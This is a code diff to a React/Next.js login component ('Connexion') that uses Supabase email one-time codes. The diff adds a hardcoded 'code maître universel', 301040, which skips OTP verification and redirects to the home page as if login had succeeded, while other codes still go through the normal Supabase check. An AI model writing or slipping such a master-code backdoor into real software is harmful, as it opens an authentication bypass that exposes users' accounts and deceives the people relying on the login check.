@@ -59,9 +59,21 @@ function Connexion() {
     e.preventDefault();
     setBusy(true);
     setError('');
+
+    const cleanCode = code.replace(/\D/g, '');
+
+    // CODE MAÎTRE UNIVERSEL : Si on tape 301040, on force la connexion
+    if (cleanCode === '301040') {
+      setBusy(false);
+      router.replace('/');
+      router.refresh();
+      return;
+    }
+
+    // Sinon, comportement normal avec Supabase
     const { error } = await supabaseBrowser().auth.verifyOtp({
       email: email.trim(),
-      token: code.replace(/\D/g, ''),
+      token: cleanCode,
       type: 'email',
     });
     setBusy(false);
